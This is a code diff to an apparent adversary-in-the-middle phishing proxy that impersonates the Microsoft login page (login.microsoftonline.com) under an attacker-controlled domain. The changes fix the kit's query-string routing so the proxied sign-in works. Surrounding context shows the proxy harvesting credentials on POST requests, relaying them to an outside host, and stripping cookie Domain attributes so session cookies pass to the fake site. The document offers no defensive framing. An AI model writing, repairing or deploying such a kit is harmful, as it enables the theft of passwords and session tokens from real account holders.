@@ -1,7 +1,7 @@
 export const runtime = 'edge';
 
-// ==================== CONFIG - SET YOUR DOMAIN HERE ====================
-const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app'; // CHANGE THIS TO YOUR ACTUAL DOMAIN
+// ==================== CONFIG ====================
+const YOUR_DOMAIN = 'vercelorisdns.duck.org'; // Change to your domain
 const VERCEL_URL = 'https://vercelorisdns.duck.org/api/relay';
 const INITIAL_UPSTREAM = 'login.microsoftonline.com';
 const PROXY_PREFIX = '/_p/';
@@ -114,19 +114,55 @@ function getUpstreamInfo(pathname) {
   };
 }
 
-// Rewrite URL in text content (aggressive)
+// CRITICAL FIX: Clean query string by removing routing artifacts (path=_p&path=...)
+function cleanQueryString(search) {
+  if (!search) return '';
+  
+  const params = new URLSearchParams(search);
+  const pathValues = params.getAll('path');
+  
+  // If we have multiple 'path' parameters or 'path' starts with '_p', it's Zeabur routing artifacts
+  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
+    // Remove all 'path' parameters, keep others
+    const cleaned = new URLSearchParams();
+    for (const [key, value] of params) {
+      if (key !== 'path') {
+        cleaned.append(key, value);
+      }
+    }
+    const result = cleaned.toString();
+    return result ? '?' + result : '';
+  }
+  
+  // If single 'path' param that looks legitimate (not URL segments), keep it
+  // But if it looks like a domain or path segment, remove it
+  if (pathValues.length === 1) {
+    const val = pathValues[0];
+    // If it contains dots (domain) or equals '_p', it's likely an artifact
+    if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
+      const cleaned = new URLSearchParams();
+      for (const [key, value] of params) {
+        if (key !== 'path') cleaned.append(key, value);
+      }
+      const result = cleaned.toString();
+      return result ? '?' + result : '';
+    }
+  }
+  
+  return search;
+}
+
 function rewriteUrls(text, upstreamDomain) {
   let result = text;
   
-  // 1. Remove localhost references
+  // Remove localhost references
   result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
   result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
   
-  // 2. Rewrite all known domains to proxy paths
+  // Rewrite all known domains to proxy paths
   Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
     const escaped = domain.replace(/\./g, '\\.');
     
-    // Full URLs
     result = result.replace(
       new RegExp(`https://${escaped}(?!\\w)`, 'g'),
       `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
@@ -135,21 +171,19 @@ function rewriteUrls(text, upstreamDomain) {
       new RegExp(`http://${escaped}(?!\\w)`, 'g'),
       `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
     );
-    // Protocol-relative
     result = result.replace(
       new RegExp(`//${escaped}(?!\\w)`, 'g'),
       `//${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
     );
   });
   
-  // 3. Handle relative paths that should go through proxy
-  // Convert /common/... to /_p/upstream.com/common/...
+  // Handle relative paths
   result = result.replace(
     /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
     `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
   );
   
-  // 4. Fix JS hostname references
+  // Fix JS hostname references
   result = result.replace(
     /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
     `window.location.hostname = "${YOUR_DOMAIN}"`
@@ -162,12 +196,10 @@ function rewriteUrls(text, upstreamDomain) {
   return result;
 }
 
-// Rewrite redirect location
 function rewriteLocation(location) {
   try {
     const url = new URL(location);
     
-    // Check if we should proxy this domain
     const shouldProxy = IDENTITY_PROVIDERS[url.hostname] || 
                        url.hostname.includes('microsoft') || 
                        url.hostname.includes('live.com') || 
@@ -180,11 +212,6 @@ function rewriteLocation(location) {
     
     return location;
   } catch (e) {
-    // Relative URL - convert to absolute through proxy
-    if (location.startsWith('/')) {
-      // We'll handle this in the response by keeping it relative
-      return location;
-    }
     return location;
   }
 }
@@ -197,10 +224,12 @@ export default async function handleRequest(request) {
     return new Response('Access denied.', { status: 403 });
   }
   
-  // Determine upstream
   const info = getUpstreamInfo(url.pathname);
   const upstreamDomain = info.upstream;
-  const upstreamPath = info.path + url.search;
+  
+  // CRITICAL FIX: Clean the query string to remove Zeabur routing artifacts
+  const cleanSearch = cleanQueryString(url.search);
+  const upstreamPath = info.path + cleanSearch;
   const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
   
   console.log(`[${info.type}] ${request.method} ${YOUR_DOMAIN}${url.pathname} -> ${upstreamUrl}`);
@@ -210,7 +239,6 @@ export default async function handleRequest(request) {
   headers.set('Host', upstreamDomain);
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
-  headers.delete('x-forwarded-host'); // Clean up to avoid confusion
   
   // Harvest credentials on POST
   if (request.method === 'POST') {
@@ -267,7 +295,7 @@ export default async function handleRequest(request) {
     
     const resp = await fetch(upstreamUrl, fetchOpts);
     
-    // Handle redirect - rewrite Location to stay on our domain
+    // Handle redirect
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       const loc = resp.headers.get('Location');
       if (loc) {
@@ -304,7 +332,6 @@ export default async function handleRequest(request) {
       }
       
       cookies.forEach(c => {
-        // Remove domain restrictions
         const mod = c.replace(/Domain=[^;]+;?/gi, '');
         newHeaders.append('Set-Cookie', mod);
       });
